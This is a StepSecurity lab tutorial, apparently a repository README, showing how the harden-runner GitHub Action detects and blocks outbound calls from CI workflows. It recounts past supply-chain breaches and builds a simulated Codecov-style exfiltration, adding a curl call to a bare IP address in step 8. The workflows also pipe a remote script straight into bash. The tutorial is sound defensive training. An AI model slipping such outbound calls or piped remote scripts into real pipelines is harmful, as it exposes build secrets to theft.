<p align="left">
  <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/Logo.png" alt="Step Security Logo" width="340">
</p>

# Attack Simulation: Exfiltration of secrets from the CI/ CD pipeline
_Estimated completion time: 5 minutes_

## Summary of past incidents
### Codecov breach
In early 2021, [secrets were exfiltrated](https://about.codecov.io/security-update/) from thousands of build servers, when a popular component used in build pipelines by enterprises, startups, and open source projects - Codecov bash uploader - was modified by adversaries. None of the victims detected that secrets were being exfiltrated to two IP addresses from their build servers for 2 months.

### event-stream incident
A malicious package `flatmap-stream` was added as a direct dependency of the `event-stream` package by a new maintainer in September 2018. While the `event-stream` package was widely used, the malicious code targeted a specific software - [BitPay](https://github.com/bitpay/wallet/issues/9346). In the hijacked versions of BitPay Copay app, the malicious code steals wallet keys and exfiltrates them to the attacker's endpoint. As discussed in the [BitPay GitHub thread](https://github.com/bitpay/wallet/issues/9346) one way to find such targeted attacks is to monitor network traffic while running unit and integration tests. 

### VS Code GitHub Actions Exploit
In December 2020, [ryotkak](https://twitter.com/ryotkak) reported as part of the Bug Bounty program how he exfiltrated the `GITHUB_TOKEN` from a GitHub Actions workflow. You can read the details [here](https://www.bleepingcomputer.com/news/security/heres-how-a-researcher-broke-into-microsoft-vs-codes-github/?&web_view=true) and [here](https://blog.ryotak.me/post/vscode-write-access/). 

## How does StepSecurity mitigate this threat?
StepSecurity [`harden-runner`](https://github.com/step-security/harden-runner) analyzes the outbound calls made by the workflow and recommends the appropriate policy containing the allowed outbound endpoints. You should use it in end-to-end testing workflows to detect compromised dependencies that make outbound calls. You should also use it in release workflows to prevent exfiltration of credentials, as was the case in the Codecov breach.

## Tutorial
Learn how to prevent exfiltration of credentials from a GitHub Actions workflow. 

1. Create a fork of the repo.

2. Go to the `Actions` tab in the fork. Click the `I understand my workflows, go ahead and enable them` button. 
   
   <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/EnableActions.png" alt="Enable Actions" width="800">

3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the `ci.yml` file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step. Commit the changes either to `main` branch or any other branch.  

    ```yaml
    - uses: step-security/harden-runner@v1
      with:
        egress-policy: audit
    ```
    The updated file should look like this:
    ```yaml
    name: Test and coverage

    on: [push, pull_request, workflow_dispatch]

    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          #Add StepSecurity Harden Runner from here onwards
          - uses: step-security/harden-runner@v1
            with:
              egress-policy: audit
          - uses: actions/checkout@v2
            with:
              fetch-depth: 2
          - uses: actions/setup-go@v2
            with:
              go-version: '1.17'
          - name: Run coverage
            run: go test -race -coverprofile=coverage.txt -covermode=atomic
          - name: Upload coverage to Codecov
            run: |
              bash <(curl -s https://codecov.io/bash)
    ```

4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab to view the workflow run. 

5. You should see a link to security insights and recommendations for the workflow run. 

    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/InsightsLink.png" alt="Link to security insights" width="800">


6. Click on the link. You should see outbound traffic correlated with each step of the workflow. An outbound network policy would be recommended. 

7. Update the `ci.yml` workflow with the policy. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 

    ```yaml
    - uses: step-security/harden-runner@v1
      with:
        allowed-endpoints: 
          codecov.io:443
          github.com:443
    ```
    The updated file should look like this:
    ```yaml
    name: Test and coverage

    on: [push, pull_request, workflow_dispatch]

    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          #Add StepSecurity Harden Runner from here onwards
          - uses: step-security/harden-runner@v1
            with:
              allowed-endpoints: 
                codecov.io:443
                github.com:443
          - uses: actions/checkout@v2
            with:
              fetch-depth: 2
          - uses: actions/setup-go@v2
            with:
              go-version: '1.17'
          - name: Run coverage
            run: go test -race -coverprofile=coverage.txt -covermode=atomic
          - name: Upload coverage to Codecov
            run: |
              bash <(curl -s https://codecov.io/bash)
    ```

8. Simulate an exfiltration attack similar to Codecov. Update the workflow and add the following statement. The bash uploader is no longer vulnerable, but when it was, it would have made an additional outbound call, which is being simulated here. 

    ```yaml
    - name: Upload coverage to Codecov
      run: |
        bash <(curl -s https://codecov.io/bash)
        curl -X GET http://104.248.94.23   
    ```
    The updated file should look like this:
    ```yaml
    name: Test and coverage

    on: [push, pull_request, workflow_dispatch]

    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          #Add StepSecurity Harden Runner from here onwards
          - uses: step-security/harden-runner@v1
            with:
              allowed-endpoints: 
                codecov.io:443
                github.com:443
          - uses: actions/checkout@v2
            with:
              fetch-depth: 2
          - uses: actions/setup-go@v2
            with:
              go-version: '1.17'
          - name: Run coverage
            run: go test -race -coverprofile=coverage.txt -covermode=atomic
          - name: Upload coverage to Codecov
            run: |
              bash <(curl -s https://codecov.io/bash)
              curl -X GET http://104.248.94.23
    ```

9. This change should cause the workflow to run, as it is set to run on push.

10. Observe that the workflow fails because the call is blocked. Click the link to security insights. You can see that blocked calls are shown in Red color in the insights page. 

    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/RestrictOutboundCall.png" alt="Blocked calls are shown in Red" width="800">
